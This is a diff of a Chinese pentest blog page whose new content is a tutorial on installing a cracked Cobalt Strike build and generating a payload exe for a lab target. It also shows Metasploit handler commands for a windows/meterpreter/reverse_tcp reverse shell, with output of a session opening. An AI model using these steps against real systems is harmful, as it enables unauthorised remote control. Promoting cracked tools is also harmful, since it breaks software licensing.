@@ -46,13 +46,24 @@
   };
 </script>
 
-  <meta name="description" content="渗透测试|网络安全|信息安全|WEB安全">
-<meta property="og:type" content="website">
-<meta property="og:title" content="Timorblog">
-<meta property="og:url" content="https:&#x2F;&#x2F;timorblog.cn&#x2F;archives&#x2F;index.html">
+  <meta name="description" content="简介Cobalt Strike 分为客户端和服务端，可分布式操作、协同作战。服务器端只能运行在Linux系统中，可搭建在VPS上。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Cobalt Strike 安装">
+<meta property="og:url" content="https:&#x2F;&#x2F;timorblog.cn&#x2F;posts&#x2F;431a3a09.html">
 <meta property="og:site_name" content="Timorblog">
-<meta property="og:description" content="渗透测试|网络安全|信息安全|WEB安全">
+<meta property="og:description" content="简介Cobalt Strike 分为客户端和服务端，可分布式操作、协同作战。服务器端只能运行在Linux系统中，可搭建在VPS上。">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https:&#x2F;&#x2F;timorblog.cn&#x2F;posts&#x2F;undefined&#x2F;1.jpg">
+<meta property="og:image" content="https:&#x2F;&#x2F;timorblog.cn&#x2F;posts&#x2F;undefined&#x2F;2.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;timorblog.cn&#x2F;posts&#x2F;undefined&#x2F;3.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;timorblog.cn&#x2F;posts&#x2F;undefined&#x2F;4.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;timorblog.cn&#x2F;posts&#x2F;undefined&#x2F;5.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;timorblog.cn&#x2F;posts&#x2F;undefined&#x2F;6.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;timorblog.cn&#x2F;posts&#x2F;undefined&#x2F;7.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;timorblog.cn&#x2F;posts&#x2F;undefined&#x2F;8.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;timorblog.cn&#x2F;posts&#x2F;undefined&#x2F;9.png">
+<meta property="article:published_time" content="2020-03-03T01:44:34.000Z">
+<meta property="article:modified_time" content="2020-03-03T06:40:51.308Z">
 <meta property="article:author" content="Timor">
 <meta property="article:tag" content="Timor">
 <meta property="article:tag" content="渗透测试">
@@ -61,8 +72,9 @@
 <meta property="article:tag" content="提权">
 <meta property="article:tag" content="GETSHELL">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https:&#x2F;&#x2F;timorblog.cn&#x2F;posts&#x2F;undefined&#x2F;1.jpg">
 
-<link rel="canonical" href="https://timorblog.cn/archives/">
+<link rel="canonical" href="https://timorblog.cn/posts/431a3a09.html">
 
 
 <script id="page-configurations">
@@ -70,11 +82,11 @@
   CONFIG.page = {
     sidebar: "",
     isHome: false,
-    isPost: false
+    isPost: true
   };
 </script>
 
-  <title>归档 | Timorblog</title>
+  <title>Cobalt Strike 安装 | Timorblog</title>
   
 
 
@@ -206,232 +218,125 @@
           <div class="content">
             
 
+  <div class="posts-expand">
+      
   
   
-  
-  <div class="post-block">
-    <div class="posts-collapse">
-      <div class="collection-title">
-        <span class="collection-header">嗯..! 目前共计 23 篇日志。 继续努力。</span>
-      </div>
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://timorblog.cn/posts/431a3a09.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/xiaobai.jpg">
+      <meta itemprop="name" content="Timor">
+      <meta itemprop="description" content="渗透测试|网络安全|信息安全|WEB安全">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Timorblog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          Cobalt Strike 安装
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-03-03 09:44:34 / 修改时间：14:40:51" itemprop="dateCreated datePublished" datetime="2020-03-03T09:44:34+08:00">2020-03-03</time>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
 
       
-    <div class="collection-year">
-      <h2 class="collection-header">2020</h2>
-    </div>
+        <img src="/posts/undefined/1.jpg" class="" title="This is an 1 image">
+<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Cobalt Strike 分为客户端和服务端，可分布式操作、协同作战。服务器端只能运行在Linux系统中，可搭建在VPS上。</p>
+<a id="more"></a>
+<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>Cobalt Strike 1.4 破解汉化版<br>服务器：Centos 7.6<br>客户端：Windows 10</p>
+<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><h3 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h3><p>上传CS到服务端<br>安装java环境</p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install -y java<span class="number">-1.8</span><span class="number">.0</span>-openjdk*</span><br></pre></td></tr></table></figure>
+<p>赋权</p>
+<figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +<span class="symbol">x</span> teamserver</span><br></pre></td></tr></table></figure>
+<p>执行</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./teamserver<span class="built_in"> IP </span>pass</span><br></pre></td></tr></table></figure>
 
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
+<h3 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h3><p>要配置好Java环境<br>运行<code>cobaltstrike.bat</code></p>
+<img src="/posts/undefined/2.png" class="" title="This is an 2 image">
+<img src="/posts/undefined/3.png" class="" title="This is an 3 image">
 
-      <div class="post-meta">
-        <time itemprop="dateCreated"
-              datetime="2020-03-03T09:44:34+08:00"
-              content="2020-03-03">
-          03-03
-        </time>
-      </div>
-
-      <h3 class="post-title">
-          <a class="post-title-link" href="/posts/431a3a09.html" itemprop="url">
-            <span itemprop="name">Cobalt Strike 安装</span>
-          </a>
-      </h3>
-
-    </header>
-  </article>
-
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <div class="post-meta">
-        <time itemprop="dateCreated"
-              datetime="2020-02-26T13:37:38+08:00"
-              content="2020-02-26">
-          02-26
-        </time>
-      </div>
-
-      <h3 class="post-title">
-          <a class="post-title-link" href="/posts/59b4f38.html" itemprop="url">
-            <span itemprop="name">Frp-内网穿透工具</span>
-          </a>
-      </h3>
-
-    </header>
-  </article>
-
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <div class="post-meta">
-        <time itemprop="dateCreated"
-              datetime="2020-02-17T15:00:14+08:00"
-              content="2020-02-17">
-          02-17
-        </time>
-      </div>
-
-      <h3 class="post-title">
-          <a class="post-title-link" href="/posts/d2a75358.html" itemprop="url">
-            <span itemprop="name">AWVS Linux 破解版在 Centos7 下安装过程</span>
-          </a>
-      </h3>
-
-    </header>
-  </article>
-
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <div class="post-meta">
-        <time itemprop="dateCreated"
-              datetime="2020-01-24T10:28:54+08:00"
-              content="2020-01-24">
-          01-24
-        </time>
-      </div>
-
-      <h3 class="post-title">
-          <a class="post-title-link" href="/posts/2f7b2975.html" itemprop="url">
-            <span itemprop="name">Kali Linux基础配置</span>
-          </a>
-      </h3>
-
-    </header>
-  </article>
-
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <div class="post-meta">
-        <time itemprop="dateCreated"
-              datetime="2020-01-20T08:54:37+08:00"
-              content="2020-01-20">
-          01-20
-        </time>
-      </div>
-
-      <h3 class="post-title">
-          <a class="post-title-link" href="/posts/d12d6355.html" itemprop="url">
-            <span itemprop="name">CSRF</span>
-          </a>
-      </h3>
-
-    </header>
-  </article>
-
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <div class="post-meta">
-        <time itemprop="dateCreated"
-              datetime="2020-01-15T12:56:19+08:00"
-              content="2020-01-15">
-          01-15
-        </time>
-      </div>
-
-      <h3 class="post-title">
-          <a class="post-title-link" href="/posts/382e01ad.html" itemprop="url">
-            <span itemprop="name">Webug靶场-其他</span>
-          </a>
-      </h3>
-
-    </header>
-  </article>
-
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <div class="post-meta">
-        <time itemprop="dateCreated"
-              datetime="2020-01-15T10:15:30+08:00"
-              content="2020-01-15">
-          01-15
-        </time>
-      </div>
-
-      <h3 class="post-title">
-          <a class="post-title-link" href="/posts/33048d81.html" itemprop="url">
-            <span itemprop="name">Webug靶场-逻辑漏洞</span>
-          </a>
-      </h3>
-
-    </header>
-  </article>
-
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <div class="post-meta">
-        <time itemprop="dateCreated"
-              datetime="2020-01-14T16:12:37+08:00"
-              content="2020-01-14">
-          01-14
-        </time>
-      </div>
-
-      <h3 class="post-title">
-          <a class="post-title-link" href="/posts/54783098.html" itemprop="url">
-            <span itemprop="name">Webug靶场-文件上传</span>
-          </a>
-      </h3>
-
-    </header>
-  </article>
-
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <div class="post-meta">
-        <time itemprop="dateCreated"
-              datetime="2020-01-14T15:56:14+08:00"
-              content="2020-01-14">
-          01-14
-        </time>
-      </div>
-
-      <h3 class="post-title">
-          <a class="post-title-link" href="/posts/89a7edf4.html" itemprop="url">
-            <span itemprop="name">Webug靶场-任意文件下载</span>
-          </a>
-      </h3>
-
-    </header>
-  </article>
-
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <div class="post-meta">
-        <time itemprop="dateCreated"
-              datetime="2020-01-14T14:22:57+08:00"
-              content="2020-01-14">
-          01-14
-        </time>
-      </div>
-
-      <h3 class="post-title">
-          <a class="post-title-link" href="/posts/b360063c.html" itemprop="url">
-            <span itemprop="name">Webug靶场-XSS</span>
-          </a>
-      </h3>
-
-    </header>
-  </article>
-
+<h2 id="简单的攻击"><a href="#简单的攻击" class="headerlink" title="简单的攻击"></a>简单的攻击</h2><p>创建监听器</p>
+<img src="/posts/undefined/4.png" class="" title="This is an 4 image">
+<p>创建payload</p>
+<img src="/posts/undefined/5.png" class="" title="This is an 5 image">
+<p>把exe文件放到靶机内运行</p>
+<img src="/posts/undefined/6.png" class="" title="This is an 6 image">
+<img src="/posts/undefined/7.png" class="" title="This is an 7 image">
+<p>完成</p>
+<h2 id="结合msf反弹shell"><a href="#结合msf反弹shell" class="headerlink" title="结合msf反弹shell"></a>结合msf反弹shell</h2><p>打开kali开启msf</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/handler </span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="builtin-name">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="builtin-name">set</span> lhost 127.0.0.1</span><br><span class="line">lhost =&gt; 127.0.0.1</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="builtin-name">set</span> lport 4444</span><br><span class="line">lport =&gt; 4444</span><br><span class="line">msf5 exploit(multi/handler) &gt; exploit -j</span><br><span class="line">[*] Exploit running as background job 1.</span><br><span class="line">[*] Exploit completed, but <span class="literal">no</span> session was created.</span><br><span class="line"></span><br><span class="line">[!] You are binding <span class="keyword">to</span> a loopback<span class="built_in"> address </span>by setting LHOST <span class="keyword">to</span> 127.0.0.1. Did you want ReverseListenerBindAddress?</span><br><span class="line">[*] Started reverse TCP handler on 127.0.0.1:4444</span><br></pre></td></tr></table></figure>
+<p>在靶机中使用CS创建一个windows/foreign/reverse_tcp<br>host 填写为msf的ip，port填写刚才设置的ip</p>
+<img src="/posts/undefined/8.png" class="" title="This is an 8 image">
+<p>配置后门</p>
+<img src="/posts/undefined/9.png" class="" title="This is an 9 image">
+<p>在靶机上运行<br>回到kali中查看msf</p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(multi/handler) &gt; [*] Sending stage (<span class="number">180291</span> bytes) to <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">[*] Meterpreter session <span class="number">1</span> opened (<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">4444</span> -&gt; <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">36264</span>) at <span class="number">2020</span><span class="number">-03</span><span class="number">-03</span> <span class="number">01</span>:<span class="number">28</span>:<span class="number">06</span> <span class="number">-0500</span></span><br></pre></td></tr></table></figure>
+<p>成功获得会话</p>
 
     </div>
+
+    
+    
+    
+        <div>
+            
+            <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+            
+        </div>
+      <footer class="post-footer">
+
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/posts/59b4f38.html" rel="prev" title="Frp-内网穿透工具">
+      <i class="fa fa-chevron-left"></i> Frp-内网穿透工具
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
   </div>
-  
-  
-  
-
-  
-  <nav class="pagination">
-    <span class="page-number current">1</span><a class="page-number" href="/archives/page/2/">2</a><a class="page-number" href="/archives/page/3/">3</a><a class="extend next" rel="next" href="/archives/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
-  </nav>
-
 
 
           </div>
@@ -482,6 +387,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#简介"><span class="nav-number">1.</span> <span class="nav-text">简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#环境"><span class="nav-number">2.</span> <span class="nav-text">环境</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#安装"><span class="nav-number">3.</span> <span class="nav-text">安装</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#服务端"><span class="nav-number">3.1.</span> <span class="nav-text">服务端</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#客户端"><span class="nav-number">3.2.</span> <span class="nav-text">客户端</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#简单的攻击"><span class="nav-number">4.</span> <span class="nav-text">简单的攻击</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#结合msf反弹shell"><span class="nav-number">5.</span> <span class="nav-text">结合msf反弹shell</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
